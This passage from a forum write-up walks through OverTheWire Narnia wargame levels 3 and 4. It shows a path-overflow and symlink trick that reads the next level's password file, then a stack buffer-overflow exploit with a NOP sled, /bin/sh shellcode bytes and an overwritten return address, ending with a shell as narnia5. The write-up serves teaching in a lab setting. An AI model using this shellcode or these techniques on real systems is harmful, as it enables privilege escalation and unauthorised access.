<p>We move to the /tmp directory since we control everything inside of it, now we need can start playing with the input file, we know the input buffer is 32 bytes, and the output file is 16 bytes, so we could technically make something like <code>/tmp/"z"*27</code>(32-len(’/tmp/’)), and then the file we want to write to, let’s say the output file is /tmp/outforchiv.</p>
<p>When you overflow the input variable, you also overwrite the null-byte that defines where that variable’s string ends, whereas the memory location where the outfile var starts remains the same, we can abuse this, and make the file be something like /tmp/27bytes/tmp/file, and then symlink narnia4’s password to /tmp/27bytes/tmp/file, but also make a file called /tmp/file with 777 permissions.</p>
<p>When we feed the binary this path, it will overflow the buffer, overwrite the termination byte, so the input file is taken as /tmp/27bytes/tmp/file, but the output file is just /tmp/file.</p>
<p>Let’s put this theory to test:</p>
<pre><code class="lang-auto">narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ ln -s /etc/narnia_pass/narnia4 outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ touch /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ chmod 777 /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ /narnia/narnia3 $(pwd)/outforchiv
copied contents of /tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp/outforchiv to a safer place... (/tmp/outforchiv)
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$
</code></pre>
<p>Now we can cat the /tmp/outforchiv file and read the password!</p>
<h1>Challenge 4</h1>
<p>Welcome to the final challenge of this writeup, it is another buffer overflow to pop a shell, so I recommend you go back and make sure you understand the basics with challenge 2.</p>
<p>We have the following source code:</p>
<pre><code class="lang-auto">#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256]; /*Defines the buffer length*/

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc&gt;1)
        strcpy(buffer,argv[1]); /*Copies the argument to the buffer (vulnerable)*/

    return 0;
}
</code></pre>
<p>We can start by getting our padding, we know the buffer size is 256, so we can start with that, next we need our return address, so we can run: <code>ltrace ./narnia4 $(python -c 'print "A"*300')</code> and then get the address that strcpy was going to copy the A’s to (in my case it was 0xffffd4d4), so we have our padding, return address, and we can re-use the shellcode from challenge 2, which is 28 bytes long.</p>
<p>Our payload will look something like this right now:<br>
<code>./narnia4 $(python -c 'print "\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\ x80" + "\xd4\xd4\xff\xff"*4')</code></p>
<p>To clarify, I have converted the return address to little endian format (0xffffd4d4 -&gt; \xd4\xd4\xff\xff), and I have made it appear four times consecutively in the payload to increase chances of it falling into the right place, finally, I replaced the "A"s with \x90’s or no operation bytes, so the machine will skip those bytes until it reaches our shellcode.</p>
<p>This won’t work, since there is a 4 byte address between the end of the buffer and the start of the return address, so we need to add 4 bytes to our padding, making it 260.</p>
<p>Our final exploit being:</p>
<pre><code class="lang-bash">./narnia4 $(python -c 'print "\x90"*260 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4') # YOUR RETURN ADDRESS MAY VARY
</code></pre>
<p>And when we run it:</p>
<pre><code class="lang-bash">narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*(260 - 28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4')
$ whoami
narnia5
</code></pre>
<p>Bingo! I hope this writeup clarified some concepts, or helped someone start off with an idea of what is happening. If anyone has any questions, I am basically permanently reachable on both twitter (<a href="https://twitter.com/SecGus" rel="nofollow noopener">https://twitter.com/SecGus</a>), and on this platform, 0x00sec.</p>
<p>Some fun and useful resources for learning pwn are:</p>
<ul>
<li>OverTheWire Narnia (Where these challenges can be found,<a href="https://overthewire.org/wargames/narnia/" rel="nofollow noopener">https://overthewire.org/wargames/narnia/</a>)</li>
<li>Pwnable KR (<a href="http://pwnable.kr/" rel="nofollow noopener">http://pwnable.kr/</a>)</li>
<li>Root-Me (<a href="https://www.root-me.org/" rel="nofollow noopener">https://www.root-me.org/</a>)</li>
<li>HackTheBox (<a href="https://hackthebox.eu" rel="nofollow noopener">https://hackthebox.eu</a>)</li>
</ul>
          <p><a href="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362/1</link>
        <pubDate>Tue, 31 Dec 2019 02:38:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18362-1</guid>
        <source url="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362.rss">OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</source>
      </item>
  </channel>
</rss>
